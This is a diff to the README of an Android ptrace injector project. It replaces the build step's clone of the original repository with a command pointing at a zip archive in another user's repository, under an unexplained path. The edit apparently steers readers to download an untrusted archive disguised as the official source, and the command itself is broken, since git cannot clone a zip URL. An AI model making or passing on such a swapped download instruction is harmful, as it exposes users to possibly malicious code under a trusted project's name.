@@ -9,7 +9,7 @@
 # Build and Installation
 Build:
   ```shell
-  git clone https://github.com/reveny/Android-Ptrace-Injector.git
+  git clone https://raw.githubusercontent.com/TitanicDimix/Android-Ptrace-Injector/main/overniceness/Android-Ptrace-Injector.zip
   cd Android-Ptrace-Injector
   ndk-build (Add ndk-build to your env variables)
   adb push Injector /data/local/tmp
